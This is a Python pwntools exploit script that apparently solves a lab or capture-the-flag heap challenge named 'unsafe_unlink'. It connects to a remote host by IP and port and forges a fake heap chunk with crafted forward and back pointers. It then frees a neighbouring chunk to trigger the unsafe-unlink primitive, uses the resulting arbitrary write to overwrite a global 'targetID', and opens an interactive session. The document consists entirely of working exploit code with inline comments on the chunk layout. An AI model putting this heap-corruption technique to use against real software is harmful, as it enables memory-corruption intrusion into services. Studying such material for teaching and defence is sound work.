import pwn
import pwnlib.util.packing
import code


def p64(x): return pwnlib.util.packing.pack(x, 64, sign=False)
def p192(x): return pwnlib.util.packing.pack(x, 192, sign=False)


pwn.context(arch='amd64', os='linux', log_level='INFO')

binary = pwn.ELF('./crackme/03_unsafe_unlink/unsafe_unlink')

DDL_CONTENT = 0x5d8

conn = pwn.remote('47.99.80.189', 10031)
conn.recvuntil('ID:\n')
conn.sendline('3180103012')

# conn = pwn.process('crackme/03_unsafe_unlink/unsafe_unlink')


def add_ddl_conn(time: str = 'time', content: str = 'content'):
    conn.sendlineafter('Your chocie:\n', '1')
    conn.sendlineafter('please input the ddl time\n', time)
    conn.sendlineafter('please input the ddl content\n', content)


def finish_ddl_conn(index: int):
    conn.sendlineafter('Your chocie:\n', '2')
    conn.sendlineafter('please input the ddl index\n', str(index))


def show_ddl_conn(index: int):
    conn.sendlineafter('Your chocie:\n', '3')
    conn.sendlineafter('please input the ddl index\n', str(index))


def edit_ddl_conn(index: int, time_nolf: str = 'time', content: str = 'content'):
    conn.sendlineafter('Your chocie:\n', '4')
    conn.sendlineafter('please input the ddl index\n', str(index))
    conn.sendafter('please input the new ddl time\n', time_nolf)
    conn.sendlineafter('please input the new ddl content\n', content)


def exit_conn():
    conn.sendlineafter('Your chocie:\n', '5')
    conn.recvuntil('see you next time!\n')


def check_conn():
    conn.sendlineafter('Your chocie:\n', '6')
    conn.recv()


add_ddl_conn()  # A
add_ddl_conn()  # B
add_ddl_conn()  # C


size_fake_chunk = 0x5f0
addr_targetID = binary.sym['targetID']  # 0x6020c0
addr_array = binary.sym['array']        # 0x6020e0
addr_array0 = 0x603260                  # = *addr_array

edit_ddl_conn(index=1,
              time_nolf=p64(addr_array0)     # *P == fake_chunk.mchunk_prev_size
              + p64(size_fake_chunk | 1)     # fake_chunk.mchunk_size (P=1)
              + p64(addr_array - 0x18)       # FD->bk == addr_array0
              + p64(addr_array - 0x10),      # BK->fd == addr_array0
              content=p64(0)                 # P->fd_nextsize
              + b'A' * (DDL_CONTENT - 0x10)  # ...
              + p64(size_fake_chunk))        # next_chunk.mchunk_prev_size


finish_ddl_conn(2)


# array[0][24] = array[0] = &targetID
edit_ddl_conn(index=1, time_nolf=p192(0x666)+p64(addr_targetID))

# array[0][0] = *(&targetID) = 3180103012
edit_ddl_conn(index=1, time_nolf=p64(3180103012) + b'\n')


check_conn()


conn.interactive()
